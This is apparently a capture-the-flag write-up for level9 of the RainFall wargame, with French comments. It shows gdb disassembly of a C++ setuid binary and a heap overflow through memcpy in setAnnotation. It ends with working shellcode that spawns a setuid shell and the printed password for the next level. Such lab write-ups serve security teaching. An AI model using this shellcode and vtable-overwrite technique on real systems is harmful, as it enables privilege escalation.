``` bash
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile

```

``` bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c     #
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>    # allocation new(0x6c) -> 0x804a008
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5  # 2eme arg constructeur
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx      # 1er arg -> pointeur sur adress
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>    # appel constructeur N::N(this, 5)
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx # this?
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>    # new(0x6c) -> 0x804a078
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>    # constructeur N::N(this_00, 6)
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx # adresse instance allouee this_00
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c] # adresse instance allouee this
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax # adresse instance allouee this (dans esp)
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18] # adresse instance allouee this_00 (dans eax)
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax # adresse instance allouee this_00 (dans esp)
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]  # argv[1] ?
   0x08048667 <+115>:	add    eax,0x4                  # 4 dans eax
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]      # ????????
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax  # argv[1] + 4 ?
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14] # this
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax      # 1er arg this
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> # setAnnotation(this, argv[1] + 4) ?
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10] # adresse instance allouee this_00
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]      # eax 0x804a078 ---> 0x08048848 (this00)
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]      # adresse instance allouee this_00
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14] # adresse instance allouee this
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax  # adresse instance allouee this
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.

```

``` bash
(gdb) disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   ebp
   0x0804870f <+1>:	mov    ebp,esp
   0x08048711 <+3>:	sub    esp,0x18
   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]  # edx = 0x804a008: 0x08048848
   0x08048722 <+20>:	add    edx,0x4                  # + 4 = 0x804a00c    
   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax  # taille
   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax  # source
   0x08048730 <+34>:	mov    DWORD PTR [esp],edx      # dest
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret    
End of assembler dump.

```

``` bash
level9@RainFall:~$ ./level9 $(python2 -c 'print "A" * 109')
Segmentation fault (core dumped)
```
108

shellcode = 34

"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 74 + "\x0c\xa0\x04\x08"

1er echec
$(python2 -c 'import sys; sys.stdout.write("\x10\xa0\x04\x08" + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 70 + "\x0c\xa0\x04\x08")')

Program received signal SIGSEGV, Segmentation fault.
0x9958316a in ?? ()

``` bash
level9@RainFall:~$ ./level9 $(python2 -c 'import sys; sys.stdout.write("\x10\xa0\x04\x08" + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90" * 70 + "\x0c\xa0\x04\x08")')
$ id
uid=2010(bonus0) gid=2009(level9) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
